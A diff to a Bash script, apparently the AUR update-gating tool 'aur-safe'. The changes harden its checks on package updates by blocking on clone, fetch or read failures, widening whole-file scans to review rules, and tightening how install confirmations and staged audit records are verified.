+# F). The timestamp proves pacman installed it after staging when cmd_accept
+# supplies one; direct parser tests may pass 0.
 _installed_matches() {
-  local dir="$1" sha="$2" srcinfo epoch pkgver pkgrel want pkgname iver names
+  local dir="$1" sha="$2" expected_base="$3" not_before="${4:-0}"
+  local srcinfo declared_base epoch pkgver pkgrel want pkgname names record
+  local installed_name iver installed_base built_at installed_at
   srcinfo=$(git -C "$dir" show "${sha}:.SRCINFO" 2>/dev/null) || return 1
   # Leading whitespace is tolerant on purpose: well-formed files use a single
   # tab, but some real AUR packages ship space-indented .SRCINFO (e.g.
   # opera-developer). awk's default-FS already handles this in find_pkg_dir;
   # these regex anchors must too, or version extraction silently fails and
   # the install check never matches.
+  declared_base=$(awk -F' = ' '/^pkgbase =/ {print $2; exit}' <<<"$srcinfo")
+  [[ "$declared_base" == "$expected_base" ]] || return 1
   pkgver=$(awk -F' = ' '/^[[:space:]]*pkgver =/ {print $2; exit}' <<<"$srcinfo")
   pkgrel=$(awk -F' = ' '/^[[:space:]]*pkgrel =/ {print $2; exit}' <<<"$srcinfo")
   epoch=$(awk -F' = ' '/^[[:space:]]*epoch =/ {print $2; exit}' <<<"$srcinfo")
   [[ -n "$pkgver" && -n "$pkgrel" ]] || return 1
   want="${pkgver}-${pkgrel}"
-  [[ -n "$epoch" ]] && want="${epoch}:${want}"
+  [[ -n "$epoch" && "$epoch" != 0 ]] && want="${epoch}:${want}"
   # pkgname= is a section header at column 0 (no leading tab), one per
-  # sub-package — identical column placement to pkgbase=. makepkg always emits
-  # it, even for non-split (where it equals pkgbase). Leading-whitespace
-  # tolerant for malformed files; pkgbase= is a defensive fallback only.
-  names=$(awk -F' = ' '/^[[:space:]]*pkgname =/ {print $2}' <<<"$srcinfo")
-  [[ -n "$names" ]] || names=$(awk -F' = ' '/^[[:space:]]*pkgbase =/ {print $2; exit}' <<<"$srcinfo")
+  # sub-package. There is deliberately no pkgbase fallback: malformed metadata
+  # cannot provide a trustworthy install-confirmation proof.
+  names=$(awk -F' = ' '/^pkgname =/ {print $2}' <<<"$srcinfo")
+  [[ -n "$names" ]] || return 1
   while IFS= read -r pkgname; do
-    [[ -z "$pkgname" ]] && continue
-    iver=$(_pacman_query "$pkgname" | awk '{print $2}')
-    [[ "$iver" = "$want" ]] && return 0
+    [[ "$pkgname" =~ ^[a-z0-9@._+-]+$ && "$pkgname" != .* ]] || continue
+    record=$(_pacman_local_record "$pkgname") || continue
+    IFS=$'\t' read -r installed_name iver installed_base built_at installed_at <<<"$record"
+    # Four-field test adapters predate the build-date field; treating their
+    # final timestamp as both values preserves the narrow seam.
+    [[ -n "$installed_at" ]] || installed_at="$built_at"
+    [[ "$installed_name" == "$pkgname" && "$installed_base" == "$expected_base" ]] || continue
+    [[ "$iver" == "$want" ]] || continue
+    [[ "$built_at" =~ ^[0-9]+$ && "$built_at" -ge "$not_before" ]] || continue
+    [[ "$installed_at" =~ ^[0-9]+$ && "$installed_at" -ge "$not_before" ]] || continue
+    return 0
   done <<<"$names"
   return 1
 }
@@ -905,7 +1101,7 @@ find_baseline_commit() {
       BEGIN { nc = split(commits, C, "\n") }
       function emit() {
         if (ver != "" && rel != "") {
-          full = (epoch != "" ? epoch COLON : "") ver DASH rel
+          full = (epoch != "" && epoch != "0" ? epoch COLON : "") ver DASH rel
           if (full == want && out == "") out = C[bi]
         }
         ver = rel = epoch = ""
@@ -931,9 +1127,13 @@ find_baseline_commit() {
 # promotes only this run's packages (cross-run isolation).
 _stage_if_gating() {
   [[ -n "${AUR_SAFE_STAGING:-}" ]] || return 0
-  local pkgbase="$1" dir="$2"
-  write_ref "$dir" "$STAGED_DIR/$pkgbase"
-  printf '%s\n' "$pkgbase" >>"$MANIFEST_FILE"
+  local pkgbase="$1" dir="$2" staged
+  staged="$STAGED_DIR/$pkgbase"
+  write_ref "$dir" "$staged" || return 1
+  if ! printf '%s\n' "$pkgbase" >>"$MANIFEST_FILE"; then
+    rm -f "$staged"
+    return 1
+  fi
 }
 
 # Clone <pkg> from AUR (AUR_URL) into a temp dir, WITHOUT cleaning up. The
@@ -951,7 +1151,7 @@ _stage_if_gating() {
 _clone_aur() {
   local -n _CLONE_DIR=$1
   local pkg="$2" tmp pkgbase
-  SCAN_SHA=""; SCAN_URL=""
+  SCAN_SHA=""; SCAN_URL=""; SCAN_PKGBASE=""
   _CLONE_DIR=""
   # Resolve pkgbase before cloning: AUR git repos are keyed by pkgbase, not
   # pkgname. Without this, a split member (opencl-nvidia-580xx) 404s on clone
@@ -959,8 +1159,9 @@ _clone_aur() {
   # Best-effort: on RPC failure (offline), fall back to $pkg — non-split still
   # clones correctly (pkgname == pkgbase); split degrades to clone-fail review.
   pkgbase=$(_resolve_pkgbase "$pkg") || pkgbase="$pkg"
-  [[ -n "$pkgbase" ]] || pkgbase="$pkg"
+  _valid_pkg_name "$pkgbase" || return 1
   tmp=$(mktemp -d) || return 1
+  _register_temp_path "$tmp"
   log "$(c_dim "→ cloning $pkgbase from AUR to $tmp")"
   if ! git clone -q -- "${AUR_URL}/${pkgbase}.git" "$tmp/$pkgbase" 2>/dev/null; then
     rm -rf "$tmp"; return 1
@@ -968,26 +1169,35 @@ _clone_aur() {
   # A valid AUR repo must have a PKGBUILD; a repo with only .install/.sh is not
   # a real package and scanning its fragments would be noise. Fail (return 1).
   [[ -f "$tmp/$pkgbase/PKGBUILD" ]] || { rm -rf "$tmp"; return 1; }
-  SCAN_SHA=$(git -C "$tmp/$pkgbase" rev-parse "origin/${AUR_REMOTE_BRANCH}" 2>/dev/null || true)
+  if ! SCAN_SHA=$(git -C "$tmp/$pkgbase" rev-parse --verify "origin/${AUR_REMOTE_BRANCH}" 2>/dev/null) \
+      || [[ ! "$SCAN_SHA" =~ ^[0-9a-f]{40}$ ]]; then
+    rm -rf "$tmp"
+    SCAN_SHA=""
+    return 1
+  fi
   SCAN_URL=$(git -C "$tmp/$pkgbase" config --get remote.origin.url 2>/dev/null || true)
   # _CLONE_DIR leaf IS the resolved pkgbase — callers derive the trust-anchor
   # key from "${dir##*/}" (mirrors the cached path), so split packages stage
   # under pkgbase, not pkgname.
+  SCAN_PKGBASE="$pkgbase"
   _CLONE_DIR="$tmp/$pkgbase"
 }
 
-# Absolute (whole-file) scan of a cloned dir against the HARD rule set only.
-# Sets globals: SCAN_HITS (1 if any hard rule fired, else 0), SCAN_CONTENT
-# (concatenated PKGBUILD+*.install+*.sh, caller may stash for `explain`).
-# Returns 1 if no content could be read, else 0. Review rules are deliberately
-# NOT run: a whole-file scan has no baseline, so pip/cargo/go would fire on
-# every legit package that uses them — the same reason `audit` is hard-only.
+# Absolute (whole-file) scan of a cloned dir against both rule sets.
+# Sets globals: SCAN_HITS (hard rules), SCAN_REVIEW_HITS (review rules), and
+# SCAN_CONTENT (concatenated PKGBUILD+*.install+*.sh, caller may stash for
+# `explain`). Returns 1 if no content could be read, else 0. `audit` remains
+# advisory regardless of either result; the missing-cache tier-2 caller uses
+# both as review-level signals. Skipping REVIEW_PATTERNS there made a
+# force-pushed/baseline-less `pip install` candidate silently clean (Finding G).
 _scan_whole_pkg() {
   local dir="$1" content
-  SCAN_HITS=0; SCAN_CONTENT=""
+  local -a files
+  SCAN_HITS=0; SCAN_REVIEW_HITS=0; SCAN_CONTENT=""
   shopt -s nullglob
-  content=$(cat "$dir"/PKGBUILD "$dir"/*.install "$dir"/*.sh 2>/dev/null || true)
+  files=("$dir/PKGBUILD" "$dir"/*.install "$dir"/*.sh)
   shopt -u nullglob
+  content=$(cat -- "${files[@]}" 2>/dev/null) || return 1
   [[ -z "$content" ]] && return 1
   SCAN_CONTENT="$content"
   local i hits
@@ -1000,11 +1210,21 @@ _scan_whole_pkg() {
       SCAN_HITS=1
     fi
   done
-  (( SCAN_HITS )) || log "  $(c_green "clean") no hard-rule matches"
+  for i in "${!REVIEW_NAMES[@]}"; do
+    local name="${REVIEW_NAMES[$i]}" pat="${REVIEW_PATTERNS[$i]}"
+    hits=$(grep -Eni -- "$pat" <<<"$content" 2>/dev/null || true)
+    if [[ -n "$hits" ]]; then
+      log "  $(c_yellow "review") [$name]"
+      sed 's/^/      /' <<<"$hits" | head -4 >&2
+      SCAN_REVIEW_HITS=1
+    fi
+  done
+  (( SCAN_HITS || SCAN_REVIEW_HITS )) \
+    || log "  $(c_green "clean") no hard/review-rule matches"
   return 0
 }
 
-# Clone + whole-file hard-rule scan + cleanup. Thin wrapper for `audit`
+# Clone + whole-file rule scan + cleanup. Thin wrapper for `audit`
 # (advisory new installs) and the missing-cache FALLBACK tier (no baseline
 # commit found). Sets SCAN_HITS/SCAN_CONTENT (from _scan_whole_pkg) and
 # SCAN_SHA/SCAN_URL (from _clone_aur). Returns 0 on success regardless of hits;
@@ -1020,15 +1240,19 @@ scan_clone() {
 # Like _stage_if_gating but for the missing-cache path: writes the scan-time
 # tip (captured by scan_clone into SCAN_SHA/SCAN_URL) instead of querying a
 # cache dir. Preserves the finding-1.2 TOCTOU guarantee on the missing-cache
-# branch — without this, a window-commit X' would land installed and then be
-# auto-seeded as the trusted baseline on the next gate (accepted_ref falls back
-# to the helper-cache HEAD when no accepted file exists).
+# branch — without this, the installed commit would not be tied to the candidate
+# that was actually reviewed at gate time.
 _stage_scan_if_gating() {
   [[ -n "${AUR_SAFE_STAGING:-}" ]] || return 0
-  local pkgbase="$1"
-  [[ -n "${SCAN_SHA:-}" ]] || return 0
-  printf '%s\t%s\t%s\n' "$SCAN_SHA" "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "${SCAN_URL:-}" >"$STAGED_DIR/$pkgbase"
-  printf '%s\n' "$pkgbase" >>"$MANIFEST_FILE"
+  local pkgbase="$1" staged
+  staged="$STAGED_DIR/$pkgbase"
+  [[ "${SCAN_SHA:-}" =~ ^[0-9a-f]{40}$ ]] || return 1
+  _atomic_write_record "$staged" "$SCAN_SHA"$'\t'"$(date -u +%Y-%m-%dT%H:%M:%SZ)"$'\t'"${SCAN_URL:-}" \
+    || return 1
+  if ! printf '%s\n' "$pkgbase" >>"$MANIFEST_FILE"; then
+    rm -f "$staged"
+    return 1
+  fi
 }
 
 ###############################################################################
@@ -1065,8 +1289,9 @@ classify_diff_rules() {
   done
 
   # New .install file introduced (the primary campaign vector).
-  local new_installs
-  new_installs=$(files_with_status A '.install' "$dir" "$base_ref")
+  local new_installs file_status_failed=0
+  new_installs=$(files_with_status A '.install' "$dir" "$base_ref") \
+    || file_status_failed=1
   if [[ -n "$new_installs" ]]; then
     log "  $(c_red "BLOCK") [new-install-file]"
     sed 's/^/      /' <<<"$new_installs" | head -8 >&2
@@ -1076,6 +1301,12 @@ classify_diff_rules() {
   if (( hard_hits )); then
     SCAN_DIFF_CLASS="hard"
     SCAN_DIFF_REASON="hard-rule"
+    return 0
+  fi
+  if (( file_status_failed )); then
+    log "  $(c_yellow "review") $pkg — could not enumerate added install files"
+    SCAN_DIFF_CLASS="audit_unavailable"
+    SCAN_DIFF_REASON="file-status-unavailable"
     return 0
   fi
 
@@ -1093,19 +1324,30 @@ classify_diff_rules() {
 
   # Added/removed/renamed files are outside the boring-diff allowlist. This
   # catches new scripts and other repo-surface changes before the LLM boundary.
-  local name_status status path rest
-  if ! name_status=$(git -C "$dir" diff --name-status \
-      "${base_ref}..origin/${AUR_REMOTE_BRANCH}" 2>/dev/null); then
+  local name_status_file status path rest
+  name_status_file=$(mktemp -t aur-safe-status.XXXXXX) || {
+    log "  $(c_yellow "review") $pkg — could not allocate changed-file state"
+    SCAN_DIFF_CLASS="audit_unavailable"
+    SCAN_DIFF_REASON="name-status-unavailable"
+    return 0
+  }
+  _register_temp_path "$name_status_file"
+  if ! git -C "$dir" diff --name-status -z \
+      "${base_ref}..origin/${AUR_REMOTE_BRANCH}" >"$name_status_file" 2>/dev/null; then
+    rm -f "$name_status_file"
     log "  $(c_yellow "review") $pkg — could not enumerate changed files"
     SCAN_DIFF_CLASS="audit_unavailable"
     SCAN_DIFF_REASON="name-status-unavailable"
     return 0
   fi
-  while IFS=$'\t' read -r status path rest; do
-    [[ -z "$status" ]] && continue
+  while IFS= read -r -d '' status && IFS= read -r -d '' path; do
+    rest=""
+    case "$status" in R*|C*) IFS= read -r -d '' rest || rest="<missing-path>" ;; esac
     if [[ "$status" != "M" ]]; then
       log "  $(c_yellow "review") [added-removed-file]"
-      printf '      %s\n' "$name_status" >&2
+      printf '      %s\t%s' "$status" "$path" >&2
+      [[ -n "$rest" ]] && printf '\t%s' "$rest" >&2
+      printf '\n' >&2
       review_hits=1
       break
     fi
@@ -1118,13 +1360,19 @@ classify_diff_rules() {
         break
         ;;
     esac
-  done <<<"$name_status"
+  done <"$name_status_file"
+  rm -f "$name_status_file"
 
   # Modified .install file (existing hook tampered with). The payload *lines*
   # inside are already caught by the hard rules above; this flags the structural
   # change itself as defense-in-depth for unknown evasion payloads.
   local mod_installs
-  mod_installs=$(files_with_status M '.install' "$dir" "$base_ref")
+  if ! mod_installs=$(files_with_status M '.install' "$dir" "$base_ref"); then
+    log "  $(c_yellow "review") $pkg — could not enumerate modified install files"
+    SCAN_DIFF_CLASS="audit_unavailable"
+    SCAN_DIFF_REASON="file-status-unavailable"
+    return 0
+  fi
   if [[ -n "$mod_installs" ]]; then
     log "  $(c_yellow "review") [modified-install-file]"
     sed 's/^/      /' <<<"$mod_installs" | head -4 >&2
@@ -1135,8 +1383,13 @@ classify_diff_rules() {
   # committed binaries (-bin packages download via source=()); a new one is
   # unusual and a plausible payload-hiding vector.
   local new_files new_bins
-  new_files=$(git -C "$dir" diff --name-only --diff-filter=A \
-    "${base_ref}..origin/${AUR_REMOTE_BRANCH}" 2>/dev/null)
+  if ! new_files=$(git -C "$dir" diff --name-only --diff-filter=A \
+      "${base_ref}..origin/${AUR_REMOTE_BRANCH}" 2>/dev/null); then
+    log "  $(c_yellow "review") $pkg — could not enumerate added files"
+    SCAN_DIFF_CLASS="audit_unavailable"
+    SCAN_DIFF_REASON="added-files-unavailable"
+    return 0
+  fi
   if [[ -n "$new_files" ]]; then
     new_bins=$(grep -iE '\.(zip|gz|tar|tgz|bz2|xz|zst|7z|rar|bin|exe|dat|so|dll|pyc)$' \
       <<<"$new_files" 2>/dev/null || true)
@@ -1215,7 +1468,14 @@ classify_diff_rules() {
     if _srcinfo_repo_dep_added_line "$dir" "$base_ref" "$line"; then
       continue
     fi
+    if _pkgbuild_repo_dep_added_line "$dir" "$base_ref" "$line"; then
+      continue
+    fi
     if _pkgbuild_checksum_array_line "$dir" "$base_ref" "$line"; then
+      continue
+    fi
+    if _pkgbuild_source_filename_added_line "$dir" "$base_ref" "$line"; then
+      boring_edge=1
       continue
     fi
     _boring_added_line_class "$line"; cls=$?
@@ -1235,8 +1495,19 @@ classify_diff_rules() {
     # file: awk -v can't carry newlines, and inlining into the awk program
     # would be injection-prone on attacker-controlled PKGBUILD text.
     local want_file i
-    want_file=$(mktemp -t aur-safe-want.XXXXXX)
-    printf '%s\n' "${cand_want[@]}" >"$want_file"
+    if ! want_file=$(mktemp -t aur-safe-want.XXXXXX); then
+      log "  $(c_yellow "review") $pkg — could not allocate review-detail state"
+      SCAN_DIFF_CLASS="audit_unavailable"
+      SCAN_DIFF_REASON="detail-state-unavailable"
+      return 0
+    fi
+    _register_temp_path "$want_file"
+    if ! printf '%s\n' "${cand_want[@]}" >"$want_file"; then
+      rm -f "$want_file"
+      SCAN_DIFF_CLASS="audit_unavailable"
+      SCAN_DIFF_REASON="detail-state-unavailable"
+      return 0
+    fi
     # Records are tab-separated "<raw text>\t<formatted detail>" so the
     # build-logic check can run on the raw text without re-parsing the
     # formatted detail (which would break on added text containing ": ").
@@ -1291,32 +1562,50 @@ scan_diff_rules() {
   local class_reason="${SCAN_DIFF_REASON:-classifier}"
   case "$SCAN_DIFF_CLASS" in
     hard)
-      stash_flag "$pkg" "$dir" "$base_ref" hard
-      log "  $(c_dim "diff stashed: $STATE_DIR/flag.${pkg}.diff")"
+      if stash_flag "$pkg" "$dir" "$base_ref" hard; then
+        log "  $(c_dim "diff stashed: $STATE_DIR/flag.${pkg}.diff")"
+      else
+        log "  $(c_red "BLOCK") could not persist the blocked diff"
+      fi
       return 1
       ;;
     audit_unavailable)
-      return 2
+      # No evidence is not a review finding the user can safely consent past:
+      # the helper could otherwise fetch/install a candidate that was never
+      # inspected. Stop before the helper instead.
+      return 1
       ;;
     review)
-      stash_flag "$pkg" "$dir" "$base_ref" review
+      if ! stash_flag "$pkg" "$dir" "$base_ref" review; then
+        log "  $(c_red "BLOCK") could not persist the review diff"
+        return 1
+      fi
       log "  $(c_dim "diff stashed: $STATE_DIR/flag.${pkg}.diff  (run: aur-safe explain $pkg)")"
       return 2
       ;;
     boring_edge)
       if [[ "$LLM_AUTO_BORING" != "1" ]]; then
         log "  $(c_yellow "review") [boring-edge] $class_reason; LLM auto-boring disabled"
-        stash_flag "$pkg" "$dir" "$base_ref" boring-edge-review
+        if ! stash_flag "$pkg" "$dir" "$base_ref" boring-edge-review; then
+          log "  $(c_red "BLOCK") could not persist the review diff"
+          return 1
+        fi
         log "  $(c_dim "diff stashed: $STATE_DIR/flag.${pkg}.diff  (run: aur-safe explain $pkg)")"
         return 2
       fi
       if llm_check_boring_edge "$pkg" "$dir" "$base_ref"; then
-        stash_flag "$pkg" "$dir" "$base_ref" llm-auto-boring
+        if ! stash_flag "$pkg" "$dir" "$base_ref" llm-auto-boring; then
+          log "  $(c_red "BLOCK") could not persist the verified diff"
+          return 1
+        fi
         log "  $(c_dim "(LLM verified boring-edge diff)")"
         return 0
       fi
       log "  $(c_yellow "review") [boring-edge] ${LLM_BORING_REASON:-LLM verifier did not approve}"
-      stash_flag "$pkg" "$dir" "$base_ref" boring-edge-review
+      if ! stash_flag "$pkg" "$dir" "$base_ref" boring-edge-review; then
+        log "  $(c_red "BLOCK") could not persist the review diff"
+        return 1
+      fi
       log "  $(c_dim "diff stashed: $STATE_DIR/flag.${pkg}.diff  (run: aur-safe explain $pkg)")"
       return 2
       ;;
@@ -1333,31 +1622,32 @@ scan_diff_rules() {
 # Gate an update with NO cache clone. Two tiers:
 #   1. BASELINE RECOVERY (preferred): if the installed package is at a version
 #      present in AUR history, diff installed-commit..origin/master and run the
-#      FULL rule set via scan_diff_rules — same precision as the cached path
-#      (exit 1 hard / 2 review / 0 clean). This eliminates the whole-file false
-#      positives that motivated review-only-on-missing-cache (pre-existing
-#      .install hooks on ventoy-bin etc. are NOT in the delta).
+#      FULL rule set via scan_diff_rules — same delta precision as the cached
+#      path. Hard hits block; all other outcomes require consent with either the
+#      diff or whole candidate stashed, because retained history is not a trust
+#      anchor. Pre-existing hooks stay out of hard-fail delta decisions.
 #   2. WHOLE-FILE FALLBACK: if no commit matches the installed version (or the
-#      version can't be queried), clone + hard-rules-only absolute scan at
-#      review level (2 on hit / 0 on clean) — review rules on a baseline-less
-#      scan would fire on every legit pip/cargo package (design-ledger
-#      §"Missing-cache path").
-# Clone failure always returns 2 (zero signal — surface for consent, never
-# silently pass). Staging: the scan-time tip (SCAN_SHA, captured at clone) is
-# staged on clean/review but NOT hard-fail (a blocked update never reaches the
+#      version can't be queried), clone + whole-file absolute scan and ALWAYS
+#      require review (exit 2). Without a baseline, absence of known regex hits
+#      is not evidence that arbitrary PKGBUILD shell is safe; a force-pushed
+#      history must never turn into a silent clean (Finding G).
+# Clone/read failure returns 1: zero signal cannot be consented past without
+# risking an unseen install. Staging:
+# the scan-time tip (SCAN_SHA, captured at clone) is
+# staged on consent-eligible review but NOT hard-fail (a blocked update never reaches the
 # helper, so nothing to accept) — mirrors the cached path's _stage_if_gating
 # discipline and preserves the finding-1.2 TOCTOU guarantee (the AUDITED commit
 # is what `accept` would promote, not the helper's later fetch).
 missing_cache_gate() {
   local pkg="$1" dir want baseline rc pkgbase
   _clone_aur dir "$pkg" || {
-    log "  $(c_yellow "review") $pkg — could not clone (offline? AUR down?); surfacing for consent"
-    return 2
+    log "  $(c_red "BLOCK") $pkg — could not clone; no candidate was audited"
+    return 1
   }
   # _clone_aur resolved pkgname→pkgbase (Finding N) and cloned to $tmp/<pkgbase>.
   # The trust-anchor key is pkgbase (accepted/<pkgbase>), NOT pkgname — staging
   # under pkgname would write accepted/<pkgname>, invisible to the cached path's
-  # pkgbase lookup on the next gate, silently re-seeding the anchor. Flag files
+  # pkgbase lookup on the next gate, losing the confirmed anchor. Flag files
   # stay keyed by pkgname for user-facing display (explain <pkgname>).
   pkgbase="${dir##*/}"
   # Tier 1: baseline recovery. Need an installed version to match against.
@@ -1368,14 +1658,34 @@ missing_cache_gate() {
     baseline=$(find_baseline_commit "$dir" "$want")
     if [[ -n "$baseline" ]]; then
       scan_diff_rules "$pkg" "$dir" "$baseline"; rc=$?
-      rm -rf "${dir%/*}"
       case $rc in
-        1) return 1 ;;   # hard-fail: do NOT stage (blocked update → no build)
-        2) [[ -f "$STATE_DIR/flag.${pkg}.diff" ]] && _stage_scan_if_gating "$pkgbase"
+        1) rm -rf "${dir%/*}"
+           return 1 ;;   # hard-fail: do NOT stage (blocked update → no build)
+        2) rm -rf "${dir%/*}"
+           if [[ -f "$STATE_DIR/flag.${pkg}.diff" ]] \
+              && ! _stage_scan_if_gating "$pkgbase"; then
+             log "  $(c_red "BLOCK") $pkg — could not persist staged audit state"
+             return 1
+           fi
            return 2 ;;
-        *) _stage_scan_if_gating "$pkgbase"
-           log "$(c_green "ok")    $pkg — no flagged changes (baseline-recovery diff)"
-           return 0 ;;
+        *) # Retained AUR history is attacker-controlled, so a reconstructed
+           # baseline can improve delta precision but cannot earn silent trust.
+           # Show the whole candidate before consent to expose payload already
+           # present in a rewritten/poisoned baseline.
+           if ! _scan_whole_pkg "$dir" \
+              || ! _stash_content "$pkg" baseline-recovery-whole-review "$SCAN_CONTENT"; then
+             rm -rf "${dir%/*}"
+             log "  $(c_red "BLOCK") $pkg — could not persist baseline-recovery review"
+             return 1
+           fi
+           rm -rf "${dir%/*}"
+           if ! _stage_scan_if_gating "$pkgbase"; then
+             log "  $(c_red "BLOCK") $pkg — could not persist staged audit state"
+             return 1
+           fi
+           log "  $(c_yellow "review") $pkg — reconstructed history baseline; whole PKGBUILD review required"
+           log "  $(c_dim "scan stashed: $STATE_DIR/flag.${pkg}.diff  (run: aur-safe explain $pkg)")"
+           return 2 ;;
       esac
     fi
     log "  $(c_dim "(installed version not found in AUR history — whole-file fallback)")"
@@ -1383,26 +1693,28 @@ missing_cache_gate() {
     log "  $(c_dim "(no cache clone — could not query installed version; whole-file fallback)")"
   fi
 
-  # Tier 2: whole-file absolute scan, hard-rules-only, review level.
+  # Tier 2: whole-file absolute scan; baseline absence itself requires review.
   if ! _scan_whole_pkg "$dir"; then
     rm -rf "${dir%/*}"
-    log "  $(c_yellow "review") $pkg — empty PKGBUILD (no content to scan)"
-    return 2
+    log "  $(c_red "BLOCK") $pkg — empty/unreadable PKGBUILD; no auditable content"
+    return 1
   fi
   rm -rf "${dir%/*}"
-  if (( SCAN_HITS )); then
-    printf '%s\n' "$SCAN_CONTENT" >"$STATE_DIR/flag.${pkg}.diff"
-    printf '%s\n' whole-file-review >"$STATE_DIR/flag.${pkg}.context" 2>/dev/null || true
-    ln -sf "flag.${pkg}.diff" "$STATE_DIR/last-flag.diff" 2>/dev/null || true
-    printf '%s\n' "$pkg" >"$STATE_DIR/last-flag.pkg"
-    log "  $(c_yellow "review") $pkg — hard-rule hit(s) in uncached PKGBUILD; consent required"
-    log "  $(c_dim "scan stashed: $STATE_DIR/flag.${pkg}.diff  (run: aur-safe explain $pkg)")"
-    _stage_scan_if_gating "$pkgbase"
-    return 2
+  if ! _stash_content "$pkg" whole-file-review "$SCAN_CONTENT"; then
+    log "  $(c_red "BLOCK") $pkg — could not persist the review scan"
+    return 1
   fi
-  log "$(c_green "ok")    $pkg — no hard-rule matches in uncached PKGBUILD"
-  _stage_scan_if_gating "$pkgbase"
-  return 0
+  if (( SCAN_HITS || SCAN_REVIEW_HITS )); then
+    log "  $(c_yellow "review") $pkg — rule hit(s) in uncached PKGBUILD; consent required"
+  else
+    log "  $(c_yellow "review") $pkg — no history baseline; whole PKGBUILD review required"
+  fi
+  log "  $(c_dim "scan stashed: $STATE_DIR/flag.${pkg}.diff  (run: aur-safe explain $pkg)")"
+  if ! _stage_scan_if_gating "$pkgbase"; then
+    log "  $(c_red "BLOCK") $pkg — could not persist staged audit state"
+    return 1
+  fi
+  return 2
 }
 
 check_pkg() {
@@ -1411,36 +1723,49 @@ check_pkg() {
   # validates at its own entry; check_pkg must too — it's reachable from
   # cmd_check with raw user args. Reject, don't die: a gate loop shouldn't
   # abort on one bad name.
-  [[ "$pkg" =~ ^[a-z0-9@._+-]+$ ]] \
-    || { log "$(c_dim "skip") $pkg — invalid package name"; return 0; }
+  _valid_pkg_name "$pkg" \
+    || { log "$(c_red "BLOCK") $pkg — invalid package name from helper/input"; return 1; }
   local dir
   if ! dir=$(find_pkg_dir "$pkg"); then
     # No cache clone => baseline recovery: clone fresh, find the installed
     # version's commit in AUR history, and diff installed..origin/master at full
     # precision (hard/review/clean like the cached path). Falls back to a
     # whole-file hard-rules-only scan if the installed version isn't in history.
-    # See missing_cache_gate for the two-tier model and staging discipline.
+    # Both tiers require consent because retained AUR history is not a trust
+    # anchor. See missing_cache_gate for the two-tier model and staging discipline.
     missing_cache_gate "$pkg"
     return $?
   fi
   local pkgbase="${dir##*/}"
 
-  # Best-effort fetch; if offline, proceed with whatever origin/master we have.
-  git -C "$dir" fetch -q origin 2>/dev/null \
-    || log "$(c_yellow "warn:") fetch failed for $pkg (offline?); diffing cached origin/${AUR_REMOTE_BRANCH}"
+  # Helper cache is not trust evidence. Route first contact through a fresh
+  # clone before touching a potentially corrupt/stale cache repository.
+  if [[ ! -s "$ACCEPTED_DIR/$pkgbase" ]]; then
+    log "  $(c_yellow "review") $pkg — no accepted anchor; first-contact audit required"
+    missing_cache_gate "$pkg"
+    return $?
+  fi
+
+  # The helper will fetch again before building, so a failed gate-time fetch
+  # makes the candidate unknowable: scanning stale origin/master could report
+  # clean and then let the helper install a newer unseen commit. Surface as
+  # audit-unavailable and never stage.
+  if ! git -C "$dir" fetch -q origin 2>/dev/null; then
+    log "  $(c_red "BLOCK") $pkg — fetch failed; refusing to audit a stale candidate"
+    return 1
+  fi
 
   # No candidate commit => nothing to review.
   if ! git -C "$dir" rev-parse --verify -q "origin/${AUR_REMOTE_BRANCH}" >/dev/null; then
-    log "$(c_dim "skip") $pkg — no origin/${AUR_REMOTE_BRANCH}"
-    return 0
+    log "  $(c_red "BLOCK") $pkg — no origin/${AUR_REMOTE_BRANCH}; candidate unavailable"
+    return 1
   fi
 
-  # Trust anchor: aur-safe's own accepted ref (finding 1.2). Seeded from the
-  # helper-cache HEAD on first contact, then frozen — a later manipulated or
-  # stale helper HEAD can no longer silently move the diff baseline. Falls back
-  # to HEAD only if the seed itself can't be resolved.
   local base_ref
-  base_ref=$(accepted_ref "$dir" "$pkgbase") || base_ref=HEAD
+  if ! base_ref=$(accepted_ref "$dir" "$pkgbase"); then
+    log "  $(c_red "BLOCK") $pkg — accepted ref is invalid or unavailable"
+    return 1
+  fi
 
   # No changes vs the accepted ref => clean. Do NOT stage (nothing to accept).
   # Assert git diff exit code — empty output from a failed diff is not "clean"
@@ -1448,8 +1773,8 @@ check_pkg() {
   local changes
   if ! changes=$(git -C "$dir" diff --name-only \
       "${base_ref}..origin/${AUR_REMOTE_BRANCH}" 2>/dev/null); then
-    log "$(c_yellow "review") $pkg — could not diff vs accepted ref (corrupt baseline?)"
-    return 2
+    log "$(c_red "BLOCK") $pkg — could not diff vs accepted ref (corrupt baseline?)"
+    return 1
   fi
   if [[ -z "$changes" ]]; then
     log "$(c_green "ok")    $pkg — no source changes (version bump only?)"
@@ -1463,9 +1788,16 @@ check_pkg() {
   # blocked update never reaches the helper, so there's nothing to accept.
   scan_diff_rules "$pkg" "$dir" "$base_ref"; local rc=$?
   case $rc in
-    2) [[ -f "$STATE_DIR/flag.${pkg}.diff" ]] && _stage_if_gating "$pkgbase" "$dir"
+    2) if [[ -f "$STATE_DIR/flag.${pkg}.diff" ]] \
+          && ! _stage_if_gating "$pkgbase" "$dir"; then
+         log "  $(c_red "BLOCK") $pkg — could not persist staged audit state"
+         return 1
+       fi
        return 2 ;;
-    0) _stage_if_gating "$pkgbase" "$dir"
+    0) if ! _stage_if_gating "$pkgbase" "$dir"; then
+         log "  $(c_red "BLOCK") $pkg — could not persist staged audit state"
+         return 1
+       fi
        log "$(c_green "ok")    $pkg"
        return 0 ;;
     *) return 1 ;;
@@ -1562,6 +1894,7 @@ _view_review_diffs() {
     log "aur-safe: could not create temporary review file"
     return 1
   }
+  _register_temp_path "$tmp"
   for pkg in "$@"; do
     diff="$STATE_DIR/flag.${pkg}.diff"
     {
@@ -1582,7 +1915,7 @@ review_prompt() {
   # Keep the interactive review UI in the binary, not only in the generated
   # wrapper: users often have an older shell function already loaded. Returning
   # 0 lets the wrapper continue; returning 1 aborts before yay/paru runs.
-  [[ -n "${AUR_SAFE_ALLOW_REVIEW:-}" ]] && return 0
+  [[ "${AUR_SAFE_ALLOW_REVIEW:-}" == 1 ]] && return 0
   if [[ ! -t 0 ]]; then
     log "aur-safe: review needed; no blocking rule fired (non-interactive; set AUR_SAFE_ALLOW_REVIEW=1 to continue after review)"
     return 2
@@ -1632,6 +1965,9 @@ review_prompt() {
 
 cmd_gate() {
   # Enumerate AUR updates, gate each. Designed to precede `yay/paru -Syu`.
+  # Under the generated wrapper, the parent already holds this through accept;
+  # direct invocations lock at least their own state mutation.
+  _acquire_state_lock || exit 1
   local helper
   helper=$(command -v yay || command -v paru || true)
